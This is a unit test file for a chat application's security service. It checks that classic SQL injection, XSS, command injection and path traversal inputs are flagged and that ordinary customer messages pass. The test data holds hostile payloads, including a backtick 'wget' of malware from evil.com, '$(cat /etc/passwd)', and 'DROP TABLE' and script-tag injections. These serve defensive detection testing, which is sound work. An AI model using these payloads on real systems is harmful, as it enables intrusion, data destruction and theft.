/**
 * Security Service - Unit Tests
 *
 * Tests the Security Gate (Constitution Rule 9)
 * Verifies threat detection BEFORE P1/P2/P3 priority checks
 */

import { SecurityService } from "../../../services/security.service"

describe("Security Service - Threat Detection", () => {
  const WORKSPACE_ID = "test-workspace-id"
  const CUSTOMER_ID = "test-customer-id"

  describe("SQL Injection Detection", () => {
    it("should detect SQL SELECT injection", async () => {
      const message = "Show me products WHERE 1=1 OR SELECT * FROM users"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("SQL_INJECTION")
      expect(result.severity).toBe("CRITICAL")
      expect(result.message).toContain("suspicious content")
    })

    it("should detect SQL DROP TABLE injection", async () => {
      const message = "test'; DROP TABLE products; --"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("SQL_INJECTION")
      expect(result.severity).toBe("CRITICAL")
    })

    it("should detect UNION ALL SELECT injection", async () => {
      const message = "1 UNION ALL SELECT password FROM users"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("SQL_INJECTION")
      expect(result.severity).toBe("CRITICAL")
    })

    it("should allow normal text with SQL keywords in context", async () => {
      // This should be safe - just normal conversation about SQL
      const message = "I want to select a cheese from your catalog"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      // This might fail if regex is too aggressive - adjust patterns if needed
      expect(result.isSafe).toBe(true)
    })
  })

  describe("XSS (Cross-Site Scripting) Detection", () => {
    it("should detect script tag injection", async () => {
      const message = "<script>alert('XSS')</script>"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("XSS")
      expect(result.severity).toBe("HIGH")
    })

    it("should detect iframe injection", async () => {
      const message = "<iframe src='http://evil.com'></iframe>"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("XSS")
      expect(result.severity).toBe("HIGH")
    })

    it("should detect javascript: protocol", async () => {
      const message = "<a href='javascript:alert(1)'>Click me</a>"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("XSS")
      expect(result.severity).toBe("HIGH")
    })

    it("should detect onload event handler", async () => {
      const message = "<img src=x onerror='alert(1)'>"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("XSS")
      expect(result.severity).toBe("HIGH")
    })
  })

  describe("Command Injection Detection", () => {
    it("should detect shell command with semicolon", async () => {
      const message = "test; ls -la /etc"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("COMMAND_INJECTION")
      expect(result.severity).toBe("CRITICAL")
    })

    it("should detect command substitution", async () => {
      const message = "$(cat /etc/passwd)"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("COMMAND_INJECTION")
      expect(result.severity).toBe("CRITICAL")
    })

    it("should detect backtick command substitution", async () => {
      const message = "`wget http://evil.com/malware`"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("COMMAND_INJECTION")
      expect(result.severity).toBe("CRITICAL")
    })
  })

  describe("Path Traversal Detection", () => {
    it("should detect ../ traversal", async () => {
      const message = "../../etc/passwd"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("PATH_TRAVERSAL")
      expect(result.severity).toBe("HIGH")
    })

    it("should detect /etc/passwd access attempt", async () => {
      const message = "Show me /etc/passwd file"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("PATH_TRAVERSAL")
      expect(result.severity).toBe("HIGH")
    })

    it("should detect URL-encoded traversal", async () => {
      const message = "%2e%2e%2f%2e%2e%2fetc%2fpasswd"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.threatType).toBe("PATH_TRAVERSAL")
      expect(result.severity).toBe("HIGH")
    })
  })

  describe("Safe Messages", () => {
    it("should allow normal product search", async () => {
      const message = "Do you have halal cheese?"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(true)
      expect(result.threatType).toBeUndefined()
    })

    it("should allow normal Italian message", async () => {
      const message = "Vorrei ordinare del parmigiano reggiano"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(true)
      expect(result.threatType).toBeUndefined()
    })

    it("should allow messages with special characters", async () => {
      const message = "I love cheese & wine! 🧀🍷"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(true)
      expect(result.threatType).toBeUndefined()
    })

    it("should allow empty message", async () => {
      const message = ""

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(true)
      expect(result.threatType).toBeUndefined()
    })

    it("should allow whitespace-only message", async () => {
      const message = "   "

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(true)
      expect(result.threatType).toBeUndefined()
    })
  })

  describe("Security Response Format", () => {
    it("should return generic message without revealing detection details", async () => {
      const message = "SELECT * FROM users WHERE 1=1"

      const result = await SecurityService.checkMessage(
        message,
        CUSTOMER_ID,
        WORKSPACE_ID
      )

      expect(result.isSafe).toBe(false)
      expect(result.message).not.toContain("SQL")
      expect(result.message).not.toContain("injection")
      expect(result.message).toContain("suspicious content")
      expect(result.message).toContain("contact support")
    })
  })
})
